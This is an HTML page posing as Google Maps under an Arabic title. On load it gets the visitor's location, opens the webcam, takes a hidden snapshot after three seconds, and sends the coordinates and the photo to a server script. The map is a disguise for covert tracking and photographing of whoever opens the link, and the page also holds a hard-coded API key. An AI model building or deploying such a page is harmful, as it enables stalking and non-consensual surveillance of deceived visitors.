<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خرائط Google</title>
    <link rel="icon" type="image/webp" href="logo.png">
    <style>
        #map {
            height: 100vh;
            width: 100%;
        }
        video, canvas {
            position: absolute;
            bottom: 20px;
            left: 20px;
            border: 2px solid #000;
        }
        #snapshot {
            display: none;
        }
    </style>
</head>
<body>
    <div id="map"></div>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="snapshot" width="320" height="240"></canvas>

    <script>
        var jsonData = {}; // Object to store location and image data

        function initMap() {
            // Ensure that the browser supports Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(updatePosition, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function updatePosition(position) {
            var newLocation = { lat: position.coords.latitude, lng: position.coords.longitude };
            
            // Store location data in JSON object
            jsonData.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };

            // Initialize the map
            var map = new google.maps.Map(document.getElementById('map'), {
                zoom: 15,
                center: newLocation
            });
            
            var marker = new google.maps.Marker({
                position: newLocation,
                map: map,
                icon: "http://maps.google.com/mapfiles/ms/icons/blue-dot.png" // Blue marker
            });

            // Capture and store image from the camera after 3 seconds
            setTimeout(captureImage, 3000);
        }

        function showError(error) {
            console.error('Geolocation error:', error);
            alert("Error fetching geolocation.");
        }

        function openCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    var video = document.getElementById('video');
                    video.srcObject = stream;
                })
                .catch(function (error) {
                    console.error("Error accessing the camera: ", error);
                });
        }

        function captureImage() {
            var video = document.getElementById('video');
            var canvas = document.getElementById('snapshot');
            var context = canvas.getContext('2d');

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            var imageData = canvas.toDataURL('image/png');
            jsonData.image = imageData;

            sendDataToServer(jsonData);
        }

        function sendDataToServer(data) {
            fetch('save_data.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
                .then(response => response.text())
                .then(result => {
                    console.log('Data saved successfully:', result);
                })
                .catch(error => {
                    console.error('Error saving data:', error);
                });
        }

        window.onload = function () {
            openCamera();
            initMap();
        };
    </script>
    <script async
        src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCz7MVXwh_VtjqnPh5auan0QCVwVce2JX0&callback=initMap">
    </script>
</body>
</html>
